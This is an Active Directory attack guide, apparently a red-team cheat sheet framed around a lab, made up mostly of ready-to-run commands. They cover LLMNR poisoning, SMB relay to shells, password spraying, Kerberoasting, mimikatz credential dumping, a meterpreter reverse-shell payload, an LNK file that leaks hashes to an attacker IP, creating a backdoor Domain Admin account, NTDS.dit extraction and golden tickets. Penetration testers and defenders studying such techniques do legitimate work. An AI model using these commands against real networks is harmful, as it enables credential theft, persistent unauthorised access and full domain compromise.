---
title: "Active Directory Exploitation Guide"
description: "Comprehensive AD attack techniques from reconnaissance through domain compromise"
pubDate: 2026-06-20
tags: ["Active Directory", "red-team", "exploitation", "LLMNR", "Kerberoasting", "SMB"]
draft: false
---

## Lab Environment

```
2HYDRA-DC         10.0.2.250
punisher          10.0.2.220
spiderman         10.0.2.221
```

## Internal Attack Methodology

1. Start with mitm6 and responder
2. Scan to generate traffic
3. Check websites and look for alternate paths
4. Look for default creds / low hanging fruit
5. Enumerate further based on findings

**Side note:** Generally use `responder` on Linux hosts and `Inveigh` on Windows hosts.

---

## LLMNR Poisoning

LLMNR poisoning works because machines in AD environments request access to named services that don't exist. When the connection fails, the attacker requests user:hash credentials to connect to the nonexistent service. The target sends the hash, which can then be cracked offline.

### Using Responder

```bash
sudo responder -I <adapter> -dPv
```

**Note:** Use either `-w` OR `-P` flags, as WPAD and PROXY servers are mutually exclusive.

### Identifying Hashcat Modes

```bash
hashcat --help | grep <hashtype>
```

### Hashcat Attack Examples

| Attack Mode  | Hash Type | Example Command |
|---|---|---|
| Wordlist | $P$ | `hashcat -a 0 -m 400 example400.hash example.dict` |
| Wordlist + Rules | MD5 | `hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule` |
| Brute-Force | MD5 | `hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a` |
| Combinator | MD5 | `hashcat -a 1 -m 0 example0.hash example.dict example.dict` |
| Association | $1$ | `hashcat -a 9 -m 500 example500.hash 1word.dict -r rules/best64.rule` |

---

## SMB Relay (Pass-the-Hash)

Use responder to catch and relay hashes to gain control of systems.

### 1. Detect Vulnerable Targets

```bash
nmap --script=smb2-security-mode.nse -p 445 <target>
```

Look for:
```
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

### 2. Disable SMB and HTTP in Responder

```bash
sudo vim /etc/responder/Responder.conf
# or
sudo vim /usr/share/responder/Responder.conf
```

Set `SMB = Off` and `HTTP = Off`

### 3. Run Responder

```bash
sudo responder -I <interface> -dP
```

### 4. Set Up SMB Relay

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
# or
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```

### 5. Interactive Shell Access

```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
# Then connect with:
nc 127.0.0.1 11000
```

### 6. Execute Commands

```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c <command>
```

---

## Shell Access

Once you have a password or hash:

### PSExec via MSF

```bash
msfconsole
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
run
```

### PSExec with Password

```bash
impacket-psexec <domain>/<user>:'<pass>'@<DC-IP>
```

### PSExec with Hash

```bash
impacket-psexec <user>@<DC-IP> -hashes <LM>:<NT>
```

---

## Inveigh (Windows Alternative)

Inveigh is a cross-platform MITM platform for spoofing and poisoning attacks.

```bash
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

---

## Password Attacks

**⚠️ CRITICAL: BE CAREFUL ABOUT ACCOUNT LOCKOUTS. DO NOT USE MORE THAN 5 TRIES.**

### Policy Enumeration (Linux)

CrackMapExec:
```bash
crackmapexec smb <DC-IP> -u <user> -p <pass> --pass-pol
```

SMB NULL Session:
```bash
rpcclient -U "" -N <DC-IP>
querydominfo
getdompwinfo
```

Enum4Linux:
```bash
enum4linux -P <DC-IP>
enum4linux-ng -P <DC-IP> -oA <output>
```

LDAP Anonymous Bind:
```bash
ldapsearch -h <DC-IP> -x -b "DC=<domain>,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Policy Enumeration (Windows)

```bash
net use \\DC01\ipc$ "" /u:""
net use \\DC01\ipc$ "" /u:guest
net accounts
```

PowerView:
```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

### User Enumeration Methods

1. SMB NULL Session
2. LDAP Anonymous Bind
3. Kerbrute
4. Responder
5. LinkedIn2Username

### Kerbrute Setup

```bash
sudo git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
sudo make all
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

### Kerbrute Usage

```bash
kerbrute userenum -d <Domain> --dc 172.16.5.5 jsmith.txt -o output.txt
```

### Linux Password Spraying

Bash one-liner:
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <DC-IP> | grep Authority; done
```

CrackMapExec (filtering for successful logins):
```bash
sudo crackmapexec smb <DC-IP> -u valid_users.txt -p Password123 | grep +
```

### Windows Password Spraying

DomainPasswordSpray (PowerShell):
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### Local Admin Spraying

```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <hash> | grep +
```

---

## Enumerating Security Controls

### Windows Defender

```powershell
Get-MpComputerStatus
```

### AppLocker (App Whitelist)

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

PowerShell bypasses:
```powershell
%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
PowerShell_ISE.exe
```

### Constrained Language Mode

```powershell
$ExecutionContext.SessionState.LanguageMode
```
(You want "Full" language mode)

### LAPS (Windows Local Administrator Password Solution)

```powershell
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
```

---

## Credentialed Enumeration

### CrackMapExec

```bash
sudo crackmapexec smb <DC-IP> -u <user> -p <pass>
# Add switches: --users, --groups, --loggedon-users, --shares
# Spider SMB shares:
sudo crackmapexec smb <DC-IP> -u <user> -p <pass> -M spider_plus --share '<share>'
```

### SMBMap

```bash
smbmap -u <user> -p <pass> -d <domain> -H <DC-IP>
smbmap -u <user> -p <pass> -d <domain> -H <DC-IP> -R '<share>' --dir-only
```

### RPCClient

```bash
rpcclient -U "" -N <DC-IP>
rpcclient $> queryuser 0x457
rpcclient $> enumdomusers
```

### Windapsearch

Domain Admins:
```bash
python3 windapsearch.py --dc-ip <DC-IP> -u <user>@<domain> -p <pass> --da
```

Privileged Users:
```bash
python3 windapsearch.py --dc-ip <DC-IP> -u <user>@<domain> -p <pass> -PU
```

---

## IPv6 DNS Takeover

This attack exploits unused IPv6 to impersonate an IPv6 DNS and run MITM with the DC.

**Requirements:**
- DNS accessible
- IPv6 enabled but not actively used

**Triggers:**
- Machine reboot → LDAP dump
- DA login → Domain user account created

### Execution

```bash
sudo mitm6 -d <domain>
# In another terminal:
impacket-ntlmrelayx -6 -t ldaps://<DC-IPv4> -wh <fakeservicename>.<domain>.local -l <loot_folder>
```

### Extracting Secrets

```bash
impacket-secretsdump <Domain>/<DU-User>:'<DU-Pass>'@<DC-IP>
```

---

## Post-Machine Compromise

### Easy Wins

1. Kerberoasting
2. Secretsdump
3. Pass-the-X attacks

### Deeper Enumeration

1. Bloodhound / PlumHound
2. PingCastle
3. ldapdomaindump
4. Determine what this account can access
5. Check for old vulnerabilities

---

## LDAP Domain Dump

```bash
sudo ldapdomaindump ldaps://<LDAP_server> -u '<User>' -p <Password> -o <output_file>
```

---

## Bloodhound

Start Neo4j:
```bash
sudo neo4j console
```

Start Bloodhound:
```bash
sudo bloodhound
# password: neo4j1
```

Ingest data:
```bash
sudo bloodhound-python -d <domain> -u <User> -p <Password> -ns <IP> -c all
```

---

## Plumhound

Generate AD reports quickly:

```bash
sudo python3 PlumHound.py --easy -p <bloodhound_password>
# For default scan:
sudo python3 PlumHound.py -x /tasks/default.tasks -p <bloodhound_password>
```

---

## Pass-Attacks

### Pass the Password

```bash
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <password>
```

### Pass the Hash

```bash
crackmapexec smb <ip/CIDR> -u <user> -h <hash> --local-auth
```

Additional options:
```bash
--sam
--shares
--lsa
```

---

## Kerberoasting

### Grab SPNs and Dump Hashes

```bash
impacket-GetUserSPNs <DOMAIN/user:pass> -dc-ip <ip> -request
```

### Crack the Hash

```bash
hashcat -m 13100 <hash.txt> <wordlist.txt>
```

### Fix Clock Skew

```bash
sudo ntpdate -du <DC IP>
```

---

## Token Impersonation

Requires a Meterpreter shell.

```bash
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token SNEAKS.IN\\Administrator
```

---

## LNK File Attack (Watering Hole)

Create a .lnk file to trigger Responder:

```powershell
$objShell = New-Object -ComObject WScript.shell 
$lnk = $objShell.CreateShortcut("C:\test.lnk") 
$lnk.TargetPath = "\\<attack-ip>\@test.png" 
$lnk.WindowStyle = 1 
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 
$lnk.Description = "Test" 
$lnk.HotKey = "Ctrl+Alt+T" 
$lnk.Save()
```

Automate across network:
```bash
netexec smb <Target IP> -d <Domain> -u <User> -p <Password> -M slinky -o NAME=test SERVER=<Domain IP>
```

---

## GPP / cPassword Attacks

Patched in MS14-025, but may still work on older systems.

```bash
use smb_enum_gpp
gpp-decrypt <encrypted data>
```

---

## Mimikatz

Upload to compromised host:
```bash
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

Run on target:
```bash
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
sekurlsa::tickets /export
```

Get SID:
```powershell
(Get-ADDomain).DomainSID.Value
```

---

## Post-Domain Compromise

### Total Control Playbook

1. Achieve total control
2. Provide additional value (lateral movement, data exfil, etc.)
3. Add persistence

### Create Persistent User

```bash
net user /add <user> <pass> /domain
net group "Domain Admins" <user> /ADD /DOMAIN
```

---

## NTDS.dit Extraction

The NTDS.dit file contains the AD database with user, group, and password hashes.

```bash
# Run on DC:
impacket-secretsdump LOCAL -system registry_SYSTEM -ntds registry_NTDS.dit
# Crack the hashes:
hashcat -m 1000 <hashes.txt> <wordlist>
```

---

## Golden Ticket

Control any machine on the domain. You need:
1. SID
2. krbtgt hash

### Generate Golden Ticket

```bash
# In Mimikatz:
privilege::debug
lsadump::lsa /inject /name:krbtgt
# Then:
kerberos::golden /User:<User> /domain:<domain> /sid:<SID> /krbtgt:<krbtgt> /id:500 /ptt
# Open shell:
misc::cmd
```

---

## Dangerous Exploits (Reconnaissance Only)

### ZeroLogon (CVE-2020-1472)

Scanner: https://github.com/SecuraBV/CVE-2020-1472
Exploit: https://github.com/dirkjanm/CVE-2020-1472

⚠️ **If you run the exploit, change the password back immediately or the DC breaks.**

### PrintNightmare (CVE-2021-1675)

Info: https://github.com/cube0x0/CVE-2021-1675
Exploit: https://github.com/calebstewart/CVE-2021-1675

---

## Summary

This methodology provides a structured approach to AD exploitation:

1. **Reconnaissance** → LLMNR poisoning, user enumeration
2. **Access** → Password spraying, kerberoasting
3. **Post-Access** → Bloodhound analysis, token impersonation
4. **Privilege Escalation** → Golden tickets, SMB relay
5. **Domain Control** → Persistence, complete compromise

Always remember the goal: provide value to the assessment and document findings thoroughly.
